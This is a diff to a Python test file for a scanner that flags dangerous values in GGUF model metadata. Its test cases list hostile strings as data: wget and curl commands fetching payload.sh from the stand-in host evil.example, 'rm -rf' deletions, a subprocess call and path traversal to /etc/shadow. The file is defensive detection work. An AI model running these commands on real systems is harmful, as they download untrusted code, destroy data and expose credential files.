@@ -1107,12 +1107,14 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
     ("key", "value", "evidence_type"),
     [
         ("command", "rm -rf /tmp/model-cache", "command_execution"),
+        ("command", "rm -r -f /tmp/model-cache", "command_execution"),
         ("command", "sudo rm -rf /tmp/model-cache", "command_execution"),
         ("loader", "subprocess.run(['id'])", "command_execution"),
         ("payload_path", "../tmp/../../payload.bin", "path_traversal"),
         ("encoded_payload", "%2E%2e/%2e%2e/etc/shadow", "path_traversal"),
         ("download", "wget https://evil.example/payload.sh -O /tmp/payload.sh", "remote_fetch"),
         ("download", "curl -o /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl --output /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
         ("callback", "requests.get('https://evil.example/payload')", "remote_fetch"),
         ("callback", 'requests.get(url="https://evil.example/payload")', "remote_fetch"),
     ],
@@ -1133,17 +1135,28 @@ def test_gguf_metadata_value_requires_concrete_security_evidence(
     assert all(check.rule_code == "S902" for check in checks)
 
 
+def test_gguf_metadata_fetch_command_words_in_prose_are_not_remote_fetch() -> None:
+    value = "curl examples are documented at https://huggingface.co/docs/hub/security"
+
+    evidence = GgufScanner._metadata_value_security_evidence("general.description", value)
+
+    assert evidence == []
+
+
 def test_gguf_metadata_value_security_evidence_handles_adversarial_punctuation_quickly() -> None:
     malicious = "curl " + "-! " * 20_000 + "https://evil.example/payload.sh"
     benign = ("repository/name | tokenizer/path; " * 20_000) + "https://huggingface.co/org/model"
+    benign_urls = " ".join(["https://huggingface.co/org/model"] * 20_000)
 
     start = time.perf_counter()
     malicious_evidence = GgufScanner._metadata_value_security_evidence("download", malicious)
     benign_evidence = GgufScanner._metadata_value_security_evidence("description", benign)
+    benign_url_evidence = GgufScanner._metadata_value_security_evidence("description", benign_urls)
     elapsed = time.perf_counter() - start
 
     assert any(evidence["evidence_type"] == "remote_fetch" for evidence in malicious_evidence)
     assert benign_evidence == []
+    assert benign_url_evidence == []
     assert elapsed < 1.0
 
 
